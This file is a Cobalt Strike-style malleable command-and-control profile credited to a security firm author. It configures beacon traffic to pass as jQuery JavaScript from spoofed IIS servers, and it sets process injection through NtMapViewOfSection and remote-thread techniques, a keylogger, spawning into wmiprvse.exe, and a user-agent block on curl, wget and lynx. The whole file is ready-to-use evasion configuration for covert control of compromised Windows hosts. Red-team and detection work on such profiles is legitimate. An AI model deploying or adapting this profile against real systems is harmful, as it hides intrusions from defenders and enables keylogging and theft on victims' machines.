#Author: Stigs - White Knight Labs



### Auxiliary Settings ###

set sample_name "Stigs Random C2 Profile";
set host_stage "false";  # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.
set sleeptime "3000";
set pipename "Winsock2\\CatalogChangeListener-###-0";
set pipename_stager "TSVCPIPE-########-####-4###-####-############";
set jitter "33";        #       Default jitter factor (0-99%)
set useragent "<RAND>"; # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"; Use random Internet Explorer UA by default
set create_remote_thread "true"; # Allow beacon to create threads in other processes
set hijack_remote_thread "true"; # Allow beacon to run jobs by hijacking the primary thread of a suspeneded process

set tasks_max_size "3604500";


### Main HTTP Config Settings ###

http-config {
  set headers "Date, Server, Content-Length, Keep-Alive, Contentnection, Content-Type";
  header "Server" "Apache";
  header "Keep-Alive" "timeout=10, max=100";
  header "Connection" "Keep-Alive";
  set trust_x_forwarded_for "true";
  set block_useragents "curl*,lynx*,wget*";
}




### HTTPS Cert Settings ###

https-certificate {
# Self Signed Certificate Options
#       set CN       "*.azureedge.net";
#       set O        "Microsoft Corporation";
#       set C        "US";
#       set L        "Redmond";
#       set ST       "WA";
#       set OU       "Organizational Unit";
#       set validity "365";

# Imported Certificate Options
#        set keystore "domain.store";
#        set password "password";
}

# code-signer {
#       set keystore "keystore.jks";
#       set password "password";
#       set alias "server";
#       set digest_algorithm "SHA256";
#       set timestamp "false";
#       set timestamp_url "http://timestamp.digicert.com";
#}




### Post Exploitation Settings ###

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "false";
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}




### Process Injection ###

process-inject {
  set allocator "NtMapViewOfSection"; # or VirtualAllocEx
  set min_alloc "24576";
  set startrwx "false";
  set userwx "false";

  transform-x86 {
          prepend "��";
          #append
  }

  transform-x64 {
          #prepend "��";
          #append
  }

  execute {
      CreateThread "ntdll!RtlUserThreadStart";
      CreateThread;
      NtQueueApcThread-s;
      CreateRemoteThread;
      RtlCreateUserThread;
      SetThreadContext;
  }
}




### No idea why this is needed lol ###
http-get {
        set verb "GET"; # GET / POST
        set uri "/css3/index2.shtml";  # Can be space separated string. Each beacon will be assigned one of these when the stage is built

        client {
                header "Accept" "text/html, application/xhtml+xml, image/jxr, */*";
                header "Accept-Encoding" "gzip, deflate";
                header "Accept-Language" "en-US; q=0.7, en; q=0.3";
                header "Connection" "keep-alive";
                header "DNT" "1";

                metadata {
                        base64url;
                        parameter "accept";
                }
        }

        server {
                header "Content-Type" "application/yin+xml";
                header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";

                output{
                        base64;
                        print;
                }
        }
}

http-post {
        set verb "POST"; # GET / POST
        set uri "/tools/family.html";
        client {
                header "Accept" "text/html, application/xhtml+xml, */*";
                header "Accept-Encoding" "gzip, deflate";
                header "DNT" "1";
                header "Content-Type" "application/x-www-form-urlencoded";

                id {
                        base64;
                        prepend "token=";
                        header "Cookie";
                }

                output{
                        base64url;
                        prepend "input=";
                        print;
                }
        }

        server {
                header "Content-Type" "text/vnd.fly";
                header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";

                output {
                        base64;
                        print;
                }
        }
}





### Start of Real HTTP GET and POST settings ###

http-get "msrpc-azure" { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/compare/v1.44/VXK7P0GBE8"; # URI used for GET requests
    set verb "GET";

    client {

        header "Accept" "image/*, application/json, text/html";
        header "Accept-Language" "nb";
        header "Accept-Encoding" "br, compress";
	header "Access-X-Control" "True";

        metadata {
            mask; # Transform type
            base64url; # Transform type
            prepend "SESSIONID_XVQD0C55VSGX3JM="; # Cookie value
            header "Cookie";                                  # Cookie header
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            mask; # Transform type
            base64url; # Transform type
            prepend "/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */    !function(a,b){'object'==typeof module&&'object'==typeof module.exp    orts?module.exports=a.document?b(a,!0):function(a){if(!a.document)th    row new Error('jQuery requires a window with a document');return b(a    )}:b(a)}('undefined'!=typeof window?window:this,function(a,b){var c=    [],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.t    oString,k=i.hasOwnProperty,l={},m='2.2.4',n=function(a,b){return new     n.fn.init(a,b)},o=/^[suFEFFxA0]+|[suFEFFxA0]+$/g,p=/^-ms-/,q=/-    ([da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype    ={jquery:m,constructor:n,selector:'',length:0,toArray:function(){retu    rn e.call(this)},get:function(a){return null!=a?0>a?this[a+this.lengt    h]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.con    structor(),a);return b.prevObject=this,b.context=this.context,b},each:";
            append "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
            print;
        }

    }
}



http-post "msrpc-azure" { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/Construct/v1.85/JDX894ZM2WF1"; # URI used for POST block.
    set verb "POST"; # HTTP verb used in POST block. Can be GET or POST

    client {

        header "Accept" "application/xml, application/xhtml+xml, application/json";
        header "Accept-Language" "tn";
        header "Accept-Encoding" "identity, *";
	header "Access-X-Control" "True";

        id {
            mask; # Transform type
            netbiosu; # Transform type
            parameter "_KZZUEUVN";
        }

        output {
            mask; # Transform type
            netbios; # Transform type
            print;
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            mask; # Transform type
            netbiosu; # Transform type
            prepend "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            append "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            print;

        }
    }
}